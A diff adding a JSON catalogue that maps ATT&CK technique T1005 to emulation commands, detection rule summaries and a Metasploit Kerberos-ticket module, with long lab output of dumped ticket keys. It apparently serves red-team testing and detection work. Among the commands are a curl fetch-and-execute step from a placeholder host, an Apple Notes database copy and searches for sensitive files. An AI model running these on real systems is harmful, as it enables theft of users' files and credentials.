@@ -1,0 +1,2262 @@
+{
+  "tactic_id": "TA0009",
+  "tactic_name": "collection",
+  "techniques": [
+    {
+      "technique_id": "T1005",
+      "name": "Data from Local System",
+      "description": "This test searches for files of certain extensions and saves them to a single zip file prior to extraction.",
+      "platforms": [
+        "windows",
+        "linux",
+        "macos",
+        "darwin"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "$startingDirectory = \"#{starting_directory}\"\n$outputZip = \"#{output_zip_folder_path}\"\n$fileExtensionsString = \"#{file_extensions}\" \n$fileExtensions = $fileExtensionsString -split \", \"\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null\n\nFunction Search-Files {\n  param (\n    [string]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  }\n  return $files\n}\n\n$foundFiles = Search-Files -directory $startingDirectory\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName\n  Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\"\n\n  Write-Host \"Zip file created: $outputZip\\data.zip\"\n  } else {\n      Write-Host \"No files found with the specified extensions.\"\n  }",
+          "cleanup": "Remove-Item -Path  $outputZip\\data.zip -Force"
+        },
+        {
+          "executor": "bash",
+          "command": "cd $HOME\ncurl -O #{remote_url}/art\ncurl -O #{remote_url}/gta.db\ncurl -O #{remote_url}/sqlite_dump.sh\nchmod +x sqlite_dump.sh\nfind . ! -executable -exec bash -c 'if [[ \"$(head -c 15 {} | strings)\" == \"SQLite format 3\" ]]; then echo \"{}\"; ./sqlite_dump.sh {}; fi' \\;",
+          "cleanup": "rm -f $HOME/.art\nrm -f $HOME/gta.db\nrm -f $HOME/sqlite_dump.sh"
+        },
+        {
+          "executor": "sh",
+          "command": "osascript -e 'tell application \"Finder\"' -e 'set destinationFolderPath to POSIX file \"#{destination_path}\"' -e 'set notesFolderPath to (path to home folder as text) & \"Library:Group Containers:group.com.apple.notes:\"' -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file \"NoteStore.sqlite\", file \"NoteStore.sqlite-shm\", file \"NoteStore.sqlite-wal\"} of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'",
+          "cleanup": "rm \"#{destination_path}/NoteStore.sqlite*\""
+        },
+        {
+          "executor": "sh",
+          "command": "pip install stormssh && storm list",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "pip install -q stormssh 2> /dev/null && storm list | sed 's/\\x1b\\[[0-9;]*m//g'",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5",
+          "cleanup": null
+        },
+        {
+          "executor": "psh,pwsh",
+          "command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Crash Dump Created By Operating System",
+          "logsource": {
+            "product": "windows",
+            "service": "system"
+          },
+          "description": "Detects \"BugCheck\" errors indicating the system rebooted due to a crash, capturing the bugcheck code, dump file path, and report ID."
+        },
+        {
+          "title": "ADFS Database Named Pipe Connection By Uncommon Tool",
+          "logsource": {
+            "product": "windows",
+            "category": "pipe_created",
+            "definition": "Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575"
+          },
+          "description": "Detects suspicious local connections via a named pipe to the AD FS configuration database (Windows Internal Database).\nUsed to access information such as the AD FS configuration settings which contains sensitive information used to sign SAML tokens."
+        },
+        {
+          "title": "Esentutl Steals Browser Information",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "One way Qbot steals sensitive information is by extracting browser data from Internet Explorer and Microsoft Edge by using the built-in utility esentutl.exe"
+        },
+        {
+          "title": "Veeam Backup Database Suspicious Query",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects potentially suspicious SQL queries using SQLCmd targeting the Veeam backup databases in order to steal information."
+        },
+        {
+          "title": "VeeamBackup Database Credentials Dump Via Sqlcmd.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects dump of credentials in VeeamBackup dbo"
+        },
+        {
+          "title": "SQLite Chromium Profile Data DB Access",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detect usage of the \"sqlite\" binary to query databases in Chromium-based browsers for potential data stealing."
+        },
+        {
+          "title": "SQLite Firefox Profile Data DB Access",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detect usage of the \"sqlite\" binary to query databases in Firefox and other Gecko-based browsers for potential data stealing."
+        },
+        {
+          "title": "Script Interpreter Spawning Credential Scanner - Windows",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects a script interpreter process (like node.js or bun) spawning a known credential scanning tool (e.g., trufflehog, gitleaks).\nThis behavior is indicative of an attempt to find and steal secrets, as seen in the \"Shai-Hulud: The Second Coming\" campaign."
+        }
+      ],
+      "metasploit_modules": [
+        {
+          "module_path": "post/windows/manage/kerberos_tickets",
+          "module_type": "post",
+          "base_class": "Msf::Module",
+          "name": "Kerberos Ticket Management",
+          "description": "Manage kerberos tickets on a compromised host.",
+          "authors": [
+            "Will Schroeder",
+            "Spencer McIntyre"
+          ],
+          "platform": [
+            "win"
+          ],
+          "arch": [],
+          "session_types": [
+            "meterpreter"
+          ],
+          "privileged": null,
+          "rank": null,
+          "disclosure_date": null,
+          "default_target": null,
+          "cves": [],
+          "urls": [
+            "https://github.com/GhostPack/Rubeus",
+            "https://github.com/wavvs/nanorobeus"
+          ],
+          "edb_ids": [],
+          "msb_ids": [],
+          "osvdb_ids": [],
+          "bid_ids": [],
+          "mitre_techniques": [
+            {
+              "id": "T1558",
+              "name": "Steal Or Forge Kerberos Tickets"
+            },
+            {
+              "id": "T1003.004",
+              "name": "Lsa Secrets"
+            },
+            {
+              "id": "T1005",
+              "name": "Data From Local System"
+            }
+          ],
+          "notes": {
+            "stability": [
+              "CRASH_SAFE"
+            ],
+            "side_effects": [],
+            "reliability": [],
+            "aka": []
+          },
+          "compat": "{",
+          "options": [],
+          "advanced_options": [],
+          "commands": [
+            {
+              "executor": "msfconsole",
+              "command": "use post/windows/manage/kerberos_tickets && run",
+              "cleanup": null
+            }
+          ],
+          "has_documentation": true,
+          "scenario_output": "msf post(windows/manage/kerberos_tickets) > klist\nKerberos Cache\n==============\nNo tickets\n\nmsf post(windows/manage/kerberos_tickets) > run SESSION=-1 SERVICE=krbtgt/*\n\n[*] LSA Handle: 0x000001efe1bf7270\n[*] LogonSession LUID: 0x00004bc1d \n[*]   User:                  MSFLAB\\DC$\n[*]   Session:               0\n[*]   AuthenticationPackage: Kerberos\n[*]   LogonType:             Network (3)\n[*]   LogonTime:             2023-08-23 08:33:17 -0400\n[*]   Ticket[0]\n[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823135453_default_192.168.159.10_mit.kerberos.cca_948767.bin\n        Primary Principal: DC$@MSFLAB.LOCAL\n        Ccache version: 4\n        \n        Creds: 1\n          Credential[0]:\n            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL\n            Client: DC$@MSFLAB.LOCAL\n            Ticket etype: 18 (AES256)\n            Key: e515137250f072d44b7487c09b8033a34ff1c7e96ad20674007c255a0a8de2b0\n            Subkey: false\n            Ticket Length: 1006\n            Ticket Flags: 0x60a10000 (FORWARDABLE, FORWARDED, RENEWABLE, PRE_AUTHENT, CANONICALIZE)\n            Addresses: 0\n            Authdatas: 0\n            Times:\n              Auth time: 1969-12-31 19:00:00 -0500\n              Start time: 2023-08-23 08:33:17 -0400\n              End time: 2023-08-23 18:33:17 -0400\n              Renew Till: 2023-08-30 08:33:17 -0400\n            Ticket:\n              Ticket Version Number: 5\n              Realm: MSFLAB.LOCAL\n              Server Name: krbtgt/MSFLAB.LOCAL\n              Encrypted Ticket Part:\n                Ticket etype: 18 (AES256)\n                Key Version Number: 2\n                Cipher:\n                  L/csyZle+LDn1i7Yqci0vbZCHrjO8CeQXBSix3d1lCR66sR0Zq/ogR/6g3X8yGn9acvGjAtt29ZErQe4FA3ttZ6MA2p8QldvbQCvELLpQkOHKrmzd2YhWy5YxfbwzFpZT0OtFEB0gYW3AQuOyRKk5vCuljZH6bPaz77g8KUejFx80tJbmz6n2GLOzG8rcMiy/i/zYreG6TLnjZJgw3UVABFSjUKs20eSK2Le5OxSKfcBQTwaRp+BPdXWGbMNYWwTUntAZGC5G6DE9xglY0+T2D/9HFSWVesrnduMmzHR9NojQYezHJorMKh7m5/KeNEzuJUDLCkgX/Uscq8dc6XMaFH7aIsg5+nlAZBPTrYtkayun6AaTLJpqLg90ab3iYCZpvdCBKBPapg3271YVHe8i7OaDDJWXMNooi+6Jg+B1cnBRH9qQ5T2k7RQLMNez9P8dvuMkDmFpRz5KOJk+w+Mz6XFeu9g1Z4zXQ6msI060PrwvAENevTN9DKUWtDGBCQMTjBDm75sMA7Aq8KgBqKYUhP+CV+HzgFou4P1/t3l+udRBIYfQw68EHW2dQE/ZZR+oLPPHbCsbnpkp/rSFjdsl0E9Zm4upPty3M+sKd2fdZSLXs5CLBs5WeZmPrXHrHnyC/AnoLNQVTVCtv5EpM50BWooXWKHljLctHxN/W6ZXgqwZ4R7KNYIrtaAsmLrkq2K/z+zsuAWRoDKFtLWZMD9eqfsGi2bRBqPf74+mi1bPXL/1eWlUwmrjr5Buj4kvC8XB+wTRoAkSrjoAx7IglfSIKdW/5N3CX6G+smJWZCsrGIvouTzIzcpHCXgoaHypnm2B9G7yIwkDgpCFd4MW3t8ZrZXOjuReQ6Aiy9mXHlbReX9G3Xl0fj7z4cIKSV4YiyEkjXJE+eAT7GdtJEPFXJJw6Fxhdam+FL+SKVvu4kw+uvqfz72GDG24/KqM3/0L58M96oEd1LHnVoHwuPtfDA7xhvHDu8iYZOkOjDc5cwMCU0MmW5A1cijTuNfSeRRHx6xXLPKkIJH/5XWeg7BAG3lnlOgS/HKj+Uhti7fabZHUvXyGAdA7CJzZ2OUlZY6Acm9JU2EuUfFvnpEjAtasckDA43pb/r4ZNIZPxcq6gpgcdFpZIb8H7bbWdIIinDJfFkEunJ7E1TG9wSbX6j6JfThG31L7EBW+UPHlDa4k1wPFMP3lNgleVUBi0n24T1RBTb6c5W0Cw==\n[*] LogonSession LUID: 0x00001052b \n[*]   User:                  Window Manager\\DWM-1\n[*]   Session:               1\n[*]   AuthenticationPackage: Negotiate\n[*]   LogonType:             Interactive (2)\n[*]   LogonTime:             2023-08-23 08:32:38 -0400\n[*] LogonSession LUID: 0x00000aa83 \n[*]   User:                  \\\n[*]   Session:               0\n[*]   AuthenticationPackage: NTLM\n[*]   LogonType:             UndefinedLogonType (0)\n[*]   LogonTime:             2023-08-23 08:32:27 -0400\n[-] Failed to call the authentication package. LsaCallAuthenticationPackage authentication package failed with: (0x00000520) ERROR_NO_SUCH_LOGON_SESSION: A specified logon session does not exist. It may already have been terminated.\n[*] LogonSession LUID: 0x0000ae359 \n[*]   User:                  MSFLAB\\DC$\n[*]   Session:               0\n[*]   AuthenticationPackage: Kerberos\n[*]   LogonType:             Network (3)\n[*]   LogonTime:             2023-08-23 08:38:08 -0400\n[*] LogonSession LUID: 0x0000ae2d3 \n[*]   User:                  MSFLAB\\DC$\n[*]   Session:               0\n[*]   AuthenticationPackage: Kerberos\n[*]   LogonType:             Network (3)\n[*]   LogonTime:             2023-08-23 08:38:08 -0400\n[*] LogonSession LUID: 0x00004fff8 \n[*]   User:                  MSFLAB\\smcintyre\n[*]   Session:               1\n[*]   AuthenticationPackage: Negotiate\n[*]   LogonType:             Interactive (2)\n[*]   LogonTime:             2023-08-23 08:33:18 -0400\n[*] LogonSession LUID: 0x00004b823 \n[*]   User:                  MSFLAB\\DC$\n[*]   Session:               0\n[*]   AuthenticationPackage: Kerberos\n[*]   LogonType:             Network (3)\n[*]   LogonTime:             2023-08-23 08:33:17 -0400\n[*] LogonSession LUID: 0x00000b7c4 \n[*]   User:                  Font Driver Host\\UMFD-0\n[*]   Session:               0\n[*]   AuthenticationPackage: Negotiate\n[*]   LogonType:             Interactive (2)\n[*]   LogonTime:             2023-08-23 08:32:37 -0400\n[*] LogonSession LUID: 0x0001f3e4f \n[*]   User:                  MSFLAB\\DC$\n[*]   Session:               0\n[*]   AuthenticationPackage: Kerberos\n[*]   LogonType:             Network (3)\n[*]   LogonTime:             2023-08-23 09:42:34 -0400\n[*]   Ticket[0]\n[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823135459_default_192.168.159.10_mit.kerberos.cca_126280.bin\n        Primary Principal: DC$@MSFLAB.LOCAL\n        Ccache version: 4\n        \n        Creds: 1\n          Credential[0]:\n            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL\n            Client: DC$@MSFLAB.LOCAL\n            Ticket etype: 18 (AES256)\n            Key: e515137250f072d44b7487c09b8033a34ff1c7e96ad20674007c255a0a8de2b0\n            Subkey: false\n            Ticket Length: 1006\n            Ticket Flags: 0x60a10000 (FORWARDABLE, FORWARDED, RENEWABLE, PRE_AUTHENT, CANONICALIZE)\n            Addresses: 0\n            Authdatas: 0\n            Times:\n              Auth time: 1969-12-31 19:00:00 -0500\n              Start time: 2023-08-23 08:33:17 -0400\n              End time: 2023-08-23 18:33:17 -0400\n              Renew Till: 2023-08-30 08:33:17 -0400\n            Ticket:\n              Ticket Version Number: 5\n              Realm: MSFLAB.LOCAL\n              Server Name: krbtgt/MSFLAB.LOCAL\n              Encrypted Ticket Part:\n                Ticket etype: 18 (AES256)\n                Key Version Number: 2\n                Cipher:\n                  L/csyZle+LDn1i7Yqci0vbZCHrjO8CeQXBSix3d1lCR66sR0Zq/ogR/6g3X8yGn9acvGjAtt29ZErQe4FA3ttZ6MA2p8QldvbQCvELLpQkOHKrmzd2YhWy5YxfbwzFpZT0OtFEB0gYW3AQuOyRKk5vCuljZH6bPaz77g8KUejFx80tJbmz6n2GLOzG8rcMiy/i/zYreG6TLnjZJgw3UVABFSjUKs20eSK2Le5OxSKfcBQTwaRp+BPdXWGbMNYWwTUntAZGC5G6DE9xglY0+T2D/9HFSWVesrnduMmzHR9NojQYezHJorMKh7m5/KeNEzuJUDLCkgX/Uscq8dc6XMaFH7aIsg5+nlAZBPTrYtkayun6AaTLJpqLg90ab3iYCZpvdCBKBPapg3271YVHe8i7OaDDJWXMNooi+6Jg+B1cnBRH9qQ5T2k7RQLMNez9P8dvuMkDmFpRz5KOJk+w+Mz6XFeu9g1Z4zXQ6msI060PrwvAENevTN9DKUWtDGBCQMTjBDm75sMA7Aq8KgBqKYUhP+CV+HzgFou4P1/t3l+udRBIYfQw68EHW2dQE/ZZR+oLPPHbCsbnpkp/rSFjdsl0E9Zm4upPty3M+sKd2fdZSLXs5CLBs5WeZmPrXHrHnyC/AnoLNQVTVCtv5EpM50BWooXWKHljLctHxN/W6ZXgqwZ4R7KNYIrtaAsmLrkq2K/z+zsuAWRoDKFtLWZMD9eqfsGi2bRBqPf74+mi1bPXL/1eWlUwmrjr5Buj4kvC8XB+wTRoAkSrjoAx7IglfSIKdW/5N3CX6G+smJWZCsrGIvouTzIzcpHCXgoaHypnm2B9G7yIwkDgpCFd4MW3t8ZrZXOjuReQ6Aiy9mXHlbReX9G3Xl0fj7z4cIKSV4YiyEkjXJE+eAT7GdtJEPFXJJw6Fxhdam+FL+SKVvu4kw+uvqfz72GDG24/KqM3/0L58M96oEd1LHnVoHwuPtfDA7xhvHDu8iYZOkOjDc5cwMCU0MmW5A1cijTuNfSeRRHx6xXLPKkIJH/5XWeg7BAG3lnlOgS/HKj+Uhti7fabZHUvXyGAdA7CJzZ2OUlZY6Acm9JU2EuUfFvnpEjAtasckDA43pb/r4ZNIZPxcq6gpgcdFpZIb8H7bbWdIIinDJfFkEunJ7E1TG9wSbX6j6JfThG31L7EBW+UPHlDa4k1wPFMP3lNgleVUBi0n24T1RBTb6c5W0Cw==\n[*] LogonSession LUID: 0x0001243b3 \n[*]   User:                  MSFLAB\\DC$\n[*]   Session:               0\n[*]   AuthenticationPackage: Kerberos\n[*]   LogonType:             Network (3)\n[*]   LogonTime:             2023-08-23 08:47:47 -0400\n[*] LogonSession LUID: 0x0000003e5 \n[*]   User:                  NT AUTHORITY\\LOCAL SERVICE\n[*]   Session:               0\n[*]   AuthenticationPackage: Negotiate\n[*]   LogonType:             Service (5)\n[*]   LogonTime:             2023-08-23 08:32:38 -0400\n[*] LogonSession LUID: 0x0000ae390 \n[*]   User:                  MSFLAB\\DC$\n[*]   Session:               0\n[*]   AuthenticationPackage: Kerberos\n[*]   LogonType:             Network (3)\n[*]   LogonTime:             2023-08-23 08:38:08 -0400\n[*] LogonSession LUID: 0x0000ae320 \n[*]   User:                  MSFLAB\\DC$\n[*]   Session:               0\n[*]   AuthenticationPackage: Kerberos\n[*]   LogonType:             Network (3)\n[*]   LogonTime:             2023-08-23 08:38:08 -0400\n[*] LogonSession LUID: 0x00000b7be \n[*]   User:                  Font Driver Host\\UMFD-1\n[*]   Session:               1\n[*]   AuthenticationPackage: Negotiate\n[*]   LogonType:             Interactive (2)\n[*]   LogonTime:             2023-08-23 08:32:37 -0400\n[*] LogonSession LUID: 0x00000b76e \n[*]   User:                  Font Driver Host\\UMFD-0\n[*]   Session:               0\n[*]   AuthenticationPackage: Negotiate\n[*]   LogonType:             Interactive (2)\n[*]   LogonTime:             2023-08-23 08:32:37 -0400\n[*] LogonSession LUID: 0x0000104e9 \n[*]   User:                  Window Manager\\DWM-1\n[*]   Session:               1\n[*]   AuthenticationPackage: Negotiate\n[*]   LogonType:             Interactive (2)\n[*]   LogonTime:             2023-08-23 08:32:38 -0400\n[*] LogonSession LUID: 0x00000b77b \n[*]   User:                  Font Driver Host\\UMFD-1\n[*]   Session:               1\n[*]   AuthenticationPackage: Negotiate\n[*]   LogonType:             Interactive (2)\n[*]   LogonTime:             2023-08-23 08:32:37 -0400\n[*] LogonSession LUID: 0x0000003e7 \n[*]   User:                  MSFLAB\\DC$\n[*]   Session:               0\n[*]   AuthenticationPackage: Negotiate\n[*]   LogonType:             UndefinedLogonType (0)\n[*]   LogonTime:             2023-08-23 08:32:26 -0400\n[*]   Ticket[0]\n[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823135505_default_192.168.159.10_mit.kerberos.cca_341258.bin\n        Primary Principal: DC$@MSFLAB.LOCAL\n        Ccache version: 4\n        \n        Creds: 1\n          Credential[0]:\n            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL\n            Client: DC$@MSFLAB.LOCAL\n            Ticket etype: 18 (AES256)\n            Key: 810290bb8e930190000e05de7abee1f095bfe29527cca5ad9320cf3d86260f08\n            Subkey: false\n            Ticket Length: 1006\n            Ticket Flags: 0x40e10000 (FORWARDABLE, RENEWABLE, INITIAL, PRE_AUTHENT, CANONICALIZE)\n            Addresses: 0\n            Authdatas: 0\n            Times:\n              Auth time: 1969-12-31 19:00:00 -0500\n              Start time: 2023-08-23 08:33:17 -0400\n              End time: 2023-08-23 18:33:17 -0400\n              Renew Till: 2023-08-30 08:33:17 -0400\n            Ticket:\n              Ticket Version Number: 5\n              Realm: MSFLAB.LOCAL\n              Server Name: krbtgt/MSFLAB.LOCAL\n              Encrypted Ticket Part:\n                Ticket etype: 18 (AES256)\n                Key Version Number: 2\n                Cipher:\n                  tLtOsjj8akj/iTEx/Kgidt9rW9sZ48SgEANNEpLhR1SmtI3/0e9Lq6oh35XWTKACrkFJGEOqSeBAaHwhArH2YyskGPadY2lL1qJI0zjhipeAZu4gWD4vpf2sKSL/ksOo9sthfxVMEVfq0QSxR37mPZwYI1LOyMcCOeckLGdHdlQCO7WwnbDpToyTq7TYzn13XmX0nyRFBIN436camSwYO/xRsWkhpVQKQIRgAjl7xCBMLT8/YGYangAASjBIxiXbXOtlj9zBwBjfA36cXz2yUp7MjC2kZLYI//xZZG1VVOa9nAG8vkkyi7GrXitG/m2X5s7YOG7XyvDOoC5yS7Yti+P2jGvPiWjAOSDmlwLolHSjeSIYCKwxK5Dm/LyMtUVtJRAb702FdI7lSH8oZCxQBQs92j3PKTBIMzz2+eY4r74Nemh+zIH86M4llhELhhyz86V9Utox9iURueY32LVieRIaTXmWXCGyopENrTt+LHPShBAk+Q8P3y+SGwVGxmm/CVKFN2R7IZNFiBxw627Vhw2pjFfVDjfsRV9mAvF6Axhks2aSO5rXZNZY1xW9iEbkRI3wnVYR9zgeSILxMNjyiVZvGFSllYnRWpDOqSe4n0/xw/ytD8gAHBYveBxzMPvTHN76Kcs1MGmhpsMdMBUo2UT4eeqBP//rXnuBtneb5maz0Ak+VwDZOf8Q76gcp66FIOGlRWPxpRgaCz2ISHeJ+istqRBm8gGbfqfHAbZM2PTzyyDHROuf3LgVyfhNUt8r7eYAgDCsfKBq6bq7O/KcQaBOfQN5yAgnt6CuAjyIqFaaXlsbQZ2D5s1p4WYUjrEpywWIoTQWLbCSYSAjOz+eYv50MQ3oE43hRQtg5eT0PCVmyG30VDfZDISq3Yj0hDMu20nuVuZ2cVvzccEBNgn9SRnQyYRRZQb6w9Zgs1/VYiY2SLZjmbYAo54TNDVJyseJ3Egl3Xp8BNccUkxZomgUOwP58q7XQk8lDzi4ApJMVJ0M8THDySVBJX2sB7oNn924fzghqW+wfzsXVnI2O9aLxzYnygHyp3h7ypt83sXyMTLD4tqEZ0DvcOvCoNnvis7VN8ZvvhLADoOxpJPALc8n+q70rfCdukZQpICUhLc16Z+JZJkGdAZtmi1Um+Cwy7lmBA+IvRp+abyklx19ulv55CbU7K8NAftJUOof/MgmAre+pOmwLofZgaSu7wVQ65fBeb8bjA==\n[*]   Ticket[1]\n[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823135505_default_192.168.159.10_mit.kerberos.cca_389858.bin\n        Primary Principal: DC$@MSFLAB.LOCAL\n        Ccache version: 4\n        \n        Creds: 1\n          Credential[0]:\n            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL\n            Client: DC$@MSFLAB.LOCAL\n            Ticket etype: 18 (AES256)\n            Key: 810290bb8e930190000e05de7abee1f095bfe29527cca5ad9320cf3d86260f08\n            Subkey: false\n            Ticket Length: 1006\n            Ticket Flags: 0x40e10000 (FORWARDABLE, RENEWABLE, INITIAL, PRE_AUTHENT, CANONICALIZE)\n            Addresses: 0\n            Authdatas: 0\n            Times:\n              Auth time: 1969-12-31 19:00:00 -0500\n              Start time: 2023-08-23 08:33:17 -0400\n              End time: 2023-08-23 18:33:17 -0400\n              Renew Till: 2023-08-30 08:33:17 -0400\n            Ticket:\n              Ticket Version Number: 5\n              Realm: MSFLAB.LOCAL\n              Server Name: krbtgt/MSFLAB.LOCAL\n              Encrypted Ticket Part:\n                Ticket etype: 18 (AES256)\n                Key Version Number: 2\n                Cipher:\n                  tLtOsjj8akj/iTEx/Kgidt9rW9sZ48SgEANNEpLhR1SmtI3/0e9Lq6oh35XWTKACrkFJGEOqSeBAaHwhArH2YyskGPadY2lL1qJI0zjhipeAZu4gWD4vpf2sKSL/ksOo9sthfxVMEVfq0QSxR37mPZwYI1LOyMcCOeckLGdHdlQCO7WwnbDpToyTq7TYzn13XmX0nyRFBIN436camSwYO/xRsWkhpVQKQIRgAjl7xCBMLT8/YGYangAASjBIxiXbXOtlj9zBwBjfA36cXz2yUp7MjC2kZLYI//xZZG1VVOa9nAG8vkkyi7GrXitG/m2X5s7YOG7XyvDOoC5yS7Yti+P2jGvPiWjAOSDmlwLolHSjeSIYCKwxK5Dm/LyMtUVtJRAb702FdI7lSH8oZCxQBQs92j3PKTBIMzz2+eY4r74Nemh+zIH86M4llhELhhyz86V9Utox9iURueY32LVieRIaTXmWXCGyopENrTt+LHPShBAk+Q8P3y+SGwVGxmm/CVKFN2R7IZNFiBxw627Vhw2pjFfVDjfsRV9mAvF6Axhks2aSO5rXZNZY1xW9iEbkRI3wnVYR9zgeSILxMNjyiVZvGFSllYnRWpDOqSe4n0/xw/ytD8gAHBYveBxzMPvTHN76Kcs1MGmhpsMdMBUo2UT4eeqBP//rXnuBtneb5maz0Ak+VwDZOf8Q76gcp66FIOGlRWPxpRgaCz2ISHeJ+istqRBm8gGbfqfHAbZM2PTzyyDHROuf3LgVyfhNUt8r7eYAgDCsfKBq6bq7O/KcQaBOfQN5yAgnt6CuAjyIqFaaXlsbQZ2D5s1p4WYUjrEpywWIoTQWLbCSYSAjOz+eYv50MQ3oE43hRQtg5eT0PCVmyG30VDfZDISq3Yj0hDMu20nuVuZ2cVvzccEBNgn9SRnQyYRRZQb6w9Zgs1/VYiY2SLZjmbYAo54TNDVJyseJ3Egl3Xp8BNccUkxZomgUOwP58q7XQk8lDzi4ApJMVJ0M8THDySVBJX2sB7oNn924fzghqW+wfzsXVnI2O9aLxzYnygHyp3h7ypt83sXyMTLD4tqEZ0DvcOvCoNnvis7VN8ZvvhLADoOxpJPALc8n+q70rfCdukZQpICUhLc16Z+JZJkGdAZtmi1Um+Cwy7lmBA+IvRp+abyklx19ulv55CbU7K8NAftJUOof/MgmAre+pOmwLofZgaSu7wVQ65fBeb8bjA==\n[*] LogonSession LUID: 0x0000003e4 \n[*]   User:                  MSFLAB\\DC$\n[*]   Session:               0\n[*]   AuthenticationPackage: Negotiate\n[*]   LogonType:             Service (5)\n[*]   LogonTime:             2023-08-23 08:32:37 -0400\n[*]   Ticket[0]\n[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823135507_default_192.168.159.10_mit.kerberos.cca_909298.bin\n        Primary Principal: DC$@MSFLAB.LOCAL\n        Ccache version: 4\n        \n        Creds: 1\n          Credential[0]:\n            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL\n            Client: DC$@MSFLAB.LOCAL\n            Ticket etype: 18 (AES256)\n            Key: b5c64f9aa85e1e31c9b17a28093bb39de235beeca53d844e10bbf4764cf7402e\n            Subkey: false\n            Ticket Length: 1006\n            Ticket Flags: 0x40e10000 (FORWARDABLE, RENEWABLE, INITIAL, PRE_AUTHENT, CANONICALIZE)\n            Addresses: 0\n            Authdatas: 0\n            Times:\n              Auth time: 1969-12-31 19:00:00 -0500\n              Start time: 2023-08-23 09:32:46 -0400\n              End time: 2023-08-23 19:32:46 -0400\n              Renew Till: 2023-08-30 09:32:46 -0400\n            Ticket:\n              Ticket Version Number: 5\n              Realm: MSFLAB.LOCAL\n              Server Name: krbtgt/MSFLAB.LOCAL\n              Encrypted Ticket Part:\n                Ticket etype: 18 (AES256)\n                Key Version Number: 2\n                Cipher:\n                  a5YMKhDbytSNzz+IqsxyXBURXqaCyVIpWDHu4E1wh0Q9MIVTXn163vkGYUz0X4LuxanqMXwttX8PdYI2V/Lxx6JcPzB50Jt0q4ffw0hsE/swVYEuRI8PyZl13DxE0wlGoaps9GC4l3xZM4nbqiAkPFneJQzrYgXcBWZ6ZlxJlQyGx7hOJLcsdU2KkqNOH8kRZrL/wkKNVKfHkDIkNPSkmYdSweZzuVce7v+yeNBOJpvK4odoE8ldWR6fhOGh5uSj5Fe2G+6ZG1IZREvnxMsqWQ/Ms3Os+1ZLZfH9l6sVi59MHufw98wxMFrKOBrceP0LkThwT29WXO3K3oCojYrSwLznMRKbKnUITRqzKT45a1wB/F556f4ova1GhUAmmlF7SxkGRlDuzh6c8zuKr91gaMQnzd1R95QSDl5xMP4HvWtz0N4bryhez8VbLlnUIFPdrhXtpOpp8Gp8cvEedwnmEmS7AUZyag8ohP40EgvtTXy8No8wuw0/imgIIhmRWlOvsTzUbRpoFMsNHS9h0+s6QhOyQdffMwqGea5c7inLpzJ2LofERlCvNrXVJpJ/+rkPGJasHzcnB216cFnSYuOUYzwIl9nSg1FY5jeOOOj5bcKptUuJonwldq/KJRKWq9io2bEJwOVwteBfRbz+E2KKShjWWMxS0sYhKLG1ZOUZtdLcUfwrwajexlJxM1aV48Y5yvDz7WWdxCOhNRmrjx2qmnOmbCNLgigJByqtcsUmeftfEZte5bdIWGECXOGFLsOdaLtUbW1mRPxDxHRuwTkcB4huzbtUk31pkljGDXp6LXUFOJD/IpJ3PNR6Xcf7jQ60QIkj99wT8xUHcNgJE/I9p8p5Y5EhgsY0KQOMu/OrFD0ah/VXoAl6vOS7INZXRrdVUFchBNKnRBX8aFBnIJ9pNjn1eLdGOrlpcd6HwCz9pCh9yJVs5kjxJWhOoyhOWWtNv/aghw0xPrvMTOTk8YRqe2